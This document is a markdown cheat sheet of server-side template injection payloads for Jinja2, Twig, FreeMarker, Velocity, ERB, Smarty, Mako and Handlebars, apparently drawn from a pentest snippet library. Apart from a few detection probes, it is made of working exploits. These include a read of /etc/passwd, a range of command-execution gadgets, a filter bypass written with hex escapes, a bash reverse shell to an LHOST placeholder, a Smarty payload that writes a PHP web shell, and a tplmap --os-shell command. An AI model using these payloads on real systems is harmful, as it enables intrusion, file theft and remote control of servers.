# SSTI Payloads

> Server-Side Template Injection — Jinja2, Twig, FreeMarker, ERB, Velocity, Smarty

<!-- tags: ssti, web, template, jinja2, twig, payload, exploit -->

---

## detect ssti universal
Try math operator first to confirm rendering.

```bash
echo "{{7*7}}"
```

<!-- meta: risk=safe | phase=vuln | tags=ssti,detection -->

---

## detect ssti erb tornado
Different syntax for fall-through detection.

```bash
echo "<%= 7*7 %>"
```

<!-- meta: risk=safe | phase=vuln | tags=ssti,detection,erb -->

---

## detect ssti smarty mako
Detection for `${}` style templates.

```bash
echo "\${7*7}"
```

<!-- meta: risk=safe | phase=vuln | tags=ssti,detection,smarty -->

---

## fingerprint ssti engine
Engine fingerprinting via behavior delta.

```bash
echo "{{7*'7'}}"
```

<!-- meta: risk=safe | phase=vuln | tags=ssti,fingerprint -->

---

## ssti jinja2 read file
Read /etc/passwd via Jinja2 globals.

```bash
echo "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}"
```

<!-- meta: risk=med | phase=exploit | tags=ssti,jinja2,fileread -->

---

## ssti jinja2 rce os popen
Universal popen via subclasses walk.

```bash
echo "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate() }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,rce -->

---

## ssti jinja2 rce config flask
Common Flask Jinja2 path via config object.

```bash
echo "{{ config.__class__.__init__.__globals__['os'].popen('{{CMD:str:id}}').read() }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,flask,rce -->

---

## ssti jinja2 rce cycler
Newer cycler-based gadget.

```bash
echo "{{ cycler.__init__.__globals__.os.popen('{{CMD:str:id}}').read() }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,rce -->

---

## ssti jinja2 rce lipsum
lipsum gives access to globals.

```bash
echo "{{ lipsum.__globals__['os'].popen('{{CMD:str:id}}').read() }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,rce -->

---

## bypass ssti jinja2 filter request
Bypass filtered keywords using request object access.

```bash
echo "{{ request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('{{CMD:str:id}}')|attr('read')() }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,bypass -->

---

## ssti jinja2 reverse shell
Drop reverse shell via warning subclass walk.

```bash
echo "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"bash -c 'bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:9001}} 0>&1'\").read()}}{%endif%}{% endfor %}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,revshell -->

---

## ssti twig rce self env
Twig <2 _self.env trick.

```bash
echo "{{ _self.env.registerUndefinedFilterCallback('shell_run') }}{{ _self.env.getFilter('{{CMD:str:id}}') }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,twig,rce -->

---

## ssti twig rce filter
Modern Twig RCE.

```bash
echo "{{ ['{{CMD:str:id}}']|filter('system') }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,twig,rce -->

---

## ssti freemarker rce java
Java FreeMarker template RCE.

```bash
echo "<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"{{CMD:str:id}}\")}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,freemarker,java,rce -->

---

## ssti velocity rce java
Velocity template RCE on Java apps.

```bash
echo "#set(\$x='') #set(\$rt=\$x.class.forName('java.lang.Runtime')) \$rt.getRuntime().shellRun('{{CMD:str:id}}')"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,velocity,java,rce -->

---

## ssti erb rce ruby
Embedded Ruby template injection.

```bash
echo "<%= system('{{CMD:str:id}}') %>"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,erb,ruby,rce -->

---

## ssti smarty rce php tag
Smarty self-shell gadget.

```bash
echo "{php}system('{{CMD:str:id}}');{/php}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,smarty,php,rce -->

---

## ssti smarty rce writefile
Newer Smarty bypass.

```bash
echo "{Smarty_Internal_Write_File::writeFile(\$SCRIPT_NAME,\"<?php system(\$_GET[0]); ?>\",self::clearConfig())}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,smarty,rce -->

---

## ssti mako rce python
Python Mako template injection.

```bash
echo "<%import os%>\${os.popen('{{CMD:str:id}}').read()}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,mako,python,rce -->

---

## ssti handlebars rce node
Node.js handlebars compromise via require.

```bash
echo "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('{{CMD:str:id}}').toString();\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,handlebars,node,rce -->

---

## ssti tplmap auto shell
Use tplmap to detect + run shell.

```bash
tplmap.py -u "{{URL:url:http://target.htb/page?name=}}*" --os-shell
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,tplmap,auto -->
